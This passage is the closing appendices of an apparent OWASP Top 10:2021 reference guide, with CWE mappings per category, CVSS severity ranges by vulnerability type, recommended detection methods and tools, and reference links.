| A01 | Broken Access Control | 34 | 55.97% | 6.92 | 5.93 | CWE-200, CWE-284, CWE-352, CWE-639, CWE-862 |
| A02 | Cryptographic Failures | 29 | 46.44% | 7.29 | 6.81 | CWE-259, CWE-327, CWE-331, CWE-319, CWE-916 |
| A03 | Injection | 33 | 19.09% | 7.25 | 7.15 | CWE-79, CWE-89, CWE-78, CWE-94, CWE-917 |
| A04 | Insecure Design | 40 | 24.19% | 6.46 | 6.78 | CWE-209, CWE-256, CWE-501, CWE-522, CWE-434 |
| A05 | Security Misconfiguration | 20 | 19.84% | 8.12 | 6.56 | CWE-16, CWE-611, CWE-776, CWE-942, CWE-1004 |
| A06 | Vulnerable Components | 3 | 27.96% | 5.00 | 5.00 | CWE-1104, CWE-1035 |
| A07 | Auth Failures | 22 | 14.84% | 7.40 | 6.50 | CWE-287, CWE-306, CWE-307, CWE-384, CWE-798 |
| A08 | Integrity Failures | 10 | 16.67% | 6.94 | 7.94 | CWE-345, CWE-502, CWE-829 |
| A09 | Logging Failures | 4 | 19.23% | 6.87 | 4.99 | CWE-117, CWE-532, CWE-778 |
| A10 | SSRF | 1 | 2.72% | 8.28 | 6.72 | CWE-918 |

## Appendix B: Complete CWE ID Master List by Category

### Quick Lookup: All 196 Mapped CWEs

**A01** (34): CWE-22, 23, 35, 59, 200, 201, 219, 264, 275, 276, 284, 285, 352, 359, 377, 402, 425, 441, 497, 538, 540, 548, 552, 566, 601, 639, 651, 668, 706, 862, 863, 913, 922, 1275

**A02** (29): CWE-261, 296, 310, 319, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 335, 336, 337, 338, 340, 347, 523, 720, 757, 759, 760, 780, 818, 916

**A03** (33): CWE-20, 74, 75, 77, 78, 79, 80, 83, 87, 88, 89, 90, 91, 93, 94, 95, 96, 97, 98, 99, 100, 113, 116, 138, 184, 470, 471, 564, 610, 643, 644, 652, 917

**A04** (40): CWE-73, 183, 209, 213, 235, 256, 257, 266, 269, 280, 311, 312, 313, 316, 419, 430, 434, 444, 451, 472, 501, 522, 525, 539, 579, 598, 602, 642, 646, 650, 653, 656, 657, 799, 807, 840, 841, 927, 1021, 1173

**A05** (20): CWE-2, 11, 13, 15, 16, 260, 315, 520, 526, 537, 541, 547, 611, 614, 756, 776, 942, 1004, 1032, 1174

**A06** (3): CWE-937, 1035, 1104

**A07** (22): CWE-255, 259, 287, 288, 290, 294, 295, 297, 300, 302, 304, 306, 307, 346, 384, 521, 613, 620, 640, 798, 940, 1216

**A08** (10): CWE-345, 353, 426, 494, 502, 565, 784, 829, 830, 915

**A09** (4): CWE-117, 223, 532, 778

**A10** (1): CWE-918

## Appendix C: CVSS Severity Quick Reference

| CVSS Score | Severity Rating |
|------------|----------------|
| 0.0 | None |
| 0.1 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

### Typical CVSS Ranges by Vulnerability Type

| Vulnerability Type | Typical CVSS Range | Common Score |
|-------------------|-------------------|--------------|
| SQL Injection (CWE-89) | 8.1 - 10.0 | 9.8 |
| OS Command Injection (CWE-78) | 7.5 - 10.0 | 9.8 |
| Deserialization RCE (CWE-502) | 7.5 - 9.8 | 9.3 |
| SSRF to cloud metadata (CWE-918) | 5.3 - 9.8 | 7.5 |
| Path Traversal (CWE-22) | 5.3 - 7.5 | 5.3 |
| Reflected XSS (CWE-79) | 4.3 - 6.1 | 6.1 |
| Stored XSS (CWE-79) | 5.4 - 8.0 | 6.1 |
| CSRF (CWE-352) | 4.3 - 8.8 | 6.5 |
| Authentication Bypass (CWE-287) | 7.5 - 9.8 | 9.8 |
| Missing Authorization (CWE-862) | 5.3 - 9.8 | 7.5 |
| Hard-coded Credentials (CWE-798) | 7.5 - 9.8 | 9.8 |
| XXE (CWE-611) | 7.5 - 9.8 | 7.5 |
| Open Redirect (CWE-601) | 4.7 - 6.1 | 6.1 |
| Information Disclosure (CWE-200) | 4.3 - 7.5 | 5.3 |
| Insufficient Logging (CWE-778) | 4.3 - 7.5 | 5.3 |

## Appendix D: Detection Methodology Quick Reference

| Category | Best Detection Method | Tools |
|----------|----------------------|-------|
| A01 - Broken Access Control | Manual testing, DAST | Burp Suite, OWASP ZAP, custom scripts |
| A02 - Cryptographic Failures | SAST, configuration review | testssl.sh, SSLyze, SAST scanners |
| A03 - Injection | SAST + DAST in CI/CD | SQLMap, Burp Suite, Semgrep, CodeQL |
| A04 - Insecure Design | Threat modeling, design review | STRIDE, PASTA, LINDDUN |
| A05 - Security Misconfiguration | Configuration scanning | ScoutSuite, Prowler, Lynis, CIS Benchmark |
| A06 - Vulnerable Components | SCA (Software Composition Analysis) | OWASP Dependency-Check, Snyk, Dependabot |
| A07 - Auth Failures | Manual testing, DAST | Burp Suite, Hydra, custom credential testing |
| A08 - Integrity Failures | SCA, pipeline review | Sigstore, in-toto, SLSA framework |
| A09 - Logging Failures | Log review, SIEM validation | Splunk, ELK Stack, SIEM tools |
| A10 - SSRF | Manual testing, DAST | Burp Collaborator, interactsh, SSRFmap |

---

> **References**:
> - OWASP Top 10:2021 - https://owasp.org/Top10/2021/
> - MITRE CWE Database - https://cwe.mitre.org/
> - NVD (National Vulnerability Database) - https://nvd.nist.gov/
> - PortSwigger Web Security Academy - https://portswigger.net/web-security
> - NIST SP 800-63B (Digital Identity Guidelines) - https://pages.nist.gov/800-63-3/sp800-63b.html
> - PayloadsAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings
> - HackTricks - https://book.hacktricks.xyz/
